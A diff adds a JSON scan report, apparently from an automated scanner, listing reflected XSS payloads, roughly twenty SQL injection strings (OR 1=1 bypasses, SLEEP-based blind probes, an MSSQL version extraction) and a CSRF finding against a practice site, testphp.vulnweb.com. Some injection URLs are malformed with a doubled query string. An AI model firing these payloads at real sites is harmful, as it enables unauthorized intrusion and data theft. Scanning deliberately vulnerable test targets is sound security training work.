@@ -1,0 +1,138 @@
+{
+    "target": "http://testphp.vulnweb.com/search.php?test=query",
+    "vulnerabilities": {
+        "xss": [
+            {
+                "type": "url",
+                "payload": "');alert(1);//",
+                "url": "http://testphp.vulnweb.com/search.php?test=%27%29%3Balert%281%29%3B%2F%2F",
+                "context": "reflected",
+                "parameter": "test"
+            },
+            {
+                "type": "url",
+                "payload": "'><img src=x onerror=alert(1)>",
+                "url": "http://testphp.vulnweb.com/search.php?test=%27%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
+                "context": "reflected",
+                "parameter": "test"
+            },
+            {
+                "type": "url",
+                "payload": "'\"`><script>/* *\\x2Fjavascript:alert(1)// */</script>",
+                "url": "http://testphp.vulnweb.com/search.php?test=%27%22%60%3E%3Cscript%3E%2F%2A+%2A%5Cx2Fjavascript%3Aalert%281%29%2F%2F+%2A%2F%3C%2Fscript%3E",
+                "context": "reflected",
+                "parameter": "test"
+            },
+            {
+                "type": "url",
+                "payload": "');alert(1);// or \";alert(1);//",
+                "url": "http://testphp.vulnweb.com/search.php?test=%27%29%3Balert%281%29%3B%2F%2F+or+%22%3Balert%281%29%3B%2F%2F",
+                "context": "reflected",
+                "parameter": "test"
+            },
+            {
+                "type": "form",
+                "payload": "<svg/onload='alert`XSS`'>",
+                "context": [
+                    "event_attr"
+                ],
+                "action": null,
+                "method": "post",
+                "inputs": [
+                    {
+                        "type": "text",
+                        "name": "searchFor"
+                    },
+                    {
+                        "type": "submit",
+                        "name": "goButton"
+                    }
+                ]
+            }
+        ],
+        "sqli": [
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=')",
+                "payload": "')"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=')-- -",
+                "payload": "')-- -"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=admin')--",
+                "payload": "admin')--"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=admin')#",
+                "payload": "admin')#"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=' AND 1=1 --",
+                "payload": "' AND 1=1 --"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=' AND 1=2 --",
+                "payload": "' AND 1=2 --"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=admin'--",
+                "payload": "admin'--"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=' AND 1=(SELECT COUNT(*) FROM tabname); --",
+                "payload": "' AND 1=(SELECT COUNT(*) FROM tabname); --"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=%27%20OR%201=1--",
+                "payload": "%27%20OR%201=1--"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id='",
+                "payload": "'"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=' OR 1=1--",
+                "payload": "' OR 1=1--"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id='",
+                "payload": "'"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=') OR ('1'='1",
+                "payload": "') OR ('1'='1"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=' OR 1=1#",
+                "payload": "' OR 1=1#"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=' AND SLEEP(5)--",
+                "payload": "' AND SLEEP(5)--"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=') or ('a'='a",
+                "payload": "') or ('a'='a"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=admin' or '1'='1' --",
+                "payload": "admin' or '1'='1' --"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=%27%20AND%20SLEEP(5)--",
+                "payload": "%27%20AND%20SLEEP(5)--"
+            },
+            {
+                "url": "http://testphp.vulnweb.com/search.php?test=query?id=' AND 1=CONVERT(int, (SELECT @@version))--  -- MSSQL",
+                "payload": "' AND 1=CONVERT(int, (SELECT @@version))--  -- MSSQL"
+            }
+        ],
+        "open_redirect": [],
+        "csrf": [
+            {
+                "form_action": "search.php?test=query"
+            }
+        ]
+    }
+}
